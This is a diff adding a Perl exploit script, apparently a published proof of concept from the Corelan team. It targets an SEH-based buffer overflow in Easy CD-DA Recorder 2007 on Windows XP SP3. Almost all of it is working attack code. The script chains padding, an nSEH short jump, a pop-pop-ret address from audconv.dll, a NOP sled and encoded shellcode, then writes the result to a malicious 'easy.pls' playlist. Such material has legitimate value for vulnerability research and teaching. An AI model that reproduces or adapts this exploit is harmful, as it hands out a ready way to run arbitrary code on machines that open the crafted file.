@@ -1,0 +1,77 @@
+# Exploit Title : Easy CD-DA Recorder 2007 SEH Buffer Overflow 
+# Date          : June 7, 2010
+# Author        : chap0 [http://www.seek-truth.net]
+# Software Link : http://download.cnet.com/Easy-CD-DA-Recorder/3000-2646_4-10059726.html
+# Tested on     : Windows XP SP3 En
+# Type of vuln  : SEH
+# Greetz to     : Corelan Security Team
+# The Crew		: http://www.corelan.be:8800/index.php/security/corelan-team-members/
+# Advisory		: http://www.corelan.be:8800/advisories.php?id=CORELAN-10-048
+# --------------------------------------------------------------------------------------
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+# Corelan does not want anyone to use this script
+# for malicious and/or illegal purposes
+# Corelan cannot be held responsible for any illegal use.
+#
+# Note : you are not allowed to edit/modify this code.  
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+#
+# Code :
+print "|------------------------------------------------------------------|\n";
+print "|                         __               __                      |\n";
+print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n";
+print "|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n";
+print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n";
+print "| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n";
+print "|                                                                  |\n";
+print "|                                       http://www.corelan.be:8800 |\n";
+print "|                                                                  |\n";
+print "|-------------------------------------------------[ EIP Hunters ]--|\n\n";
+print "[+] Exploit for Easy CD-DA Recorder \n";
+print "[+] Preparing payload\n";
+sleep(1);
+my $junk="\x41" x 1108;
+
+my $nseh="\xeb\x06\x90\x90";
+
+my $seh= "\x70\x80\x08\x10";   # ppr 0x10088070 [audconv.dll] 
+
+my $nops="\x90" x 24;
+
+my $shellcode=
+"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
+"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
+"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
+"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
+"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54".
+"\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x44\x4e\x53\x4b\x48\x4e\x47".
+"\x45\x50\x4a\x37\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x51\x4b\x38".
+"\x4f\x35\x42\x42\x41\x50\x4b\x4e\x49\x54\x4b\x38\x46\x43\x4b\x38".
+"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a\x46\x38\x42\x4c".
+"\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e".
+"\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x38".
+"\x4f\x45\x46\x52\x41\x30\x4b\x4e\x48\x36\x4b\x58\x4e\x50\x4b\x34".
+"\x4b\x58\x4f\x35\x4e\x51\x41\x50\x4b\x4e\x4b\x38\x4e\x31\x4b\x48".
+"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x32\x46\x50\x43\x4c\x41\x43".
+"\x42\x4c\x46\x56\x4b\x38\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x47".
+"\x4e\x30\x4b\x58\x42\x34\x4e\x30\x4b\x38\x42\x57\x4e\x51\x4d\x4a".
+"\x4b\x48\x4a\x36\x4a\x50\x4b\x4e\x49\x30\x4b\x48\x42\x58\x42\x4b".
+"\x42\x50\x42\x30\x42\x50\x4b\x38\x4a\x46\x4e\x53\x4f\x35\x41\x53".
+"\x48\x4f\x42\x56\x48\x55\x49\x48\x4a\x4f\x43\x48\x42\x4c\x4b\x37".
+"\x42\x45\x4a\x46\x42\x4f\x4c\x48\x46\x30\x4f\x55\x4a\x46\x4a\x39".
+"\x50\x4f\x4c\x48\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x56\x41\x56".
+"\x4e\x46\x43\x46\x42\x30\x5a";
+
+$padding = "\x41" x 10000;
+
+my $payload = $junk.$nseh.$seh.$nops.$shellcode.$padding;
+
+open (myfile, '>easy.pls');
+
+print myfile $payload;
+
+close (myfile);
+
+print "[+] Storm the Gates of Hell\n"
